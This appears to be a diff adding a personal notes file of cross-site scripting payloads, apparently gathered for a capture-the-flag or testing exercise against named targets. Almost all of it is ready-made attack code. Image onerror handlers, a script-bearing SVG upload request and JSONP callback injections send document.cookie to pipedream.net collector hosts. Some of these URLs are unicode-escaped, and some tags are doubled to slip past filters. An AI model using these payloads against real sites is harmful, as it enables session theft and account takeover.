@@ -1,0 +1,44 @@
+# science today payloads
+
+<iimgmg src='' ononerrorerror=document.location='https://enlq1pxzsek4.x.pipedream.net/'+document.cookie />
+
+<img src="a" onerror="document.location='https://enlq1pxzsek4.x.pipedream.net/'+document.cookie"/>
+
+science today better payload:  <img src="a" onerror="this.src='https://enlq1pxzsek4.x.pipedream.net/'+document.cookie"/>
+
+	no rerouting
+
+
+# profile svg payload
+Content-Disposition: form-data; name="file"; filename="img.svg"
+Content-Type: image/svg+xml
+
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
+   <script type="text/javascript">
+			document.location='https://ene5u2la8d9uv.x.pipedream.net/'+document.cookie
+   </script>
+</svg>
+
+
+# Sturec
+
+reflected payload
+<script src=/students.jsonp?q=000000&callback=fetch(\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0065\u006e\u0037\u0078\u006f\u0075\u0068\u0035\u006f\u007a\u007a\u0030\u0072\u002e\u0078\u002e\u0070\u0069\u0070\u0065\u0064\u0072\u0065\u0061\u006d\u002e\u006e\u0065\u0074\u002f\u003f\u0071\u003d${document['cookie']})></script>
+
+
+stored payload
+<<asdasd sscript src=/students.jsonp?q=000000&callback=fetch(\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0065\u006e\u0037\u0078\u006f\u0075\u0068\u0035\u006f\u007a\u007a\u0030\u0072\u002e\u0078\u002e\u0070\u0069\u0070\u0065\u0064\u0072\u0065\u0061\u006d\u002e\u006e\u0065\u0074\u002f\u003f\u0071\u003d${document['cookie']})></script>
+
+
+#csp
+#
+img-src i.picsum.photos unsplash.it
+
+'nonce-2726c7f26c'
+
+'strict-dynamic'
+
+
